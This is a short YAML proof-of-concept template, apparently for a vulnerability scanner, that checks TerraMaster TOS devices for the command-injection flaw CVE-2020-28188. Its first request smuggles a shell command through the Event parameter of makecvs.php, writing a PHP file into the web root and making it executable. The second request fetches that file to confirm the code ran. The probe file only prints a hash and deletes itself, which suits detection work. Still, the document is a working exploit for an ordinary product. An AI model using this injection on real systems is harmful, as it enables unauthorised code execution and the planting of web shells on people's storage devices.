detail:
  author: Print1n
  links:
  - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202012-1548
expression: r0() && r1()
manual: true
name: poc-yaml-terramaster-tos-rce-cve-2020-28188
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("text/csv")
      && response.body.bcontains(bytes("Service,DateTime"))
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /include/makecvs.php?Event=http|echo%20"<?php%20echo%20md5({{r1}});unlink(__FILE__);?>"%20>>%20/usr/www/{{r1}}.php%20&&%20chmod%20755%20/usr/www/{{r1}}.php||
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(md5(r1)))
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /{{r1}}.php
set:
  r1: randomLowercase(10)
transport: http
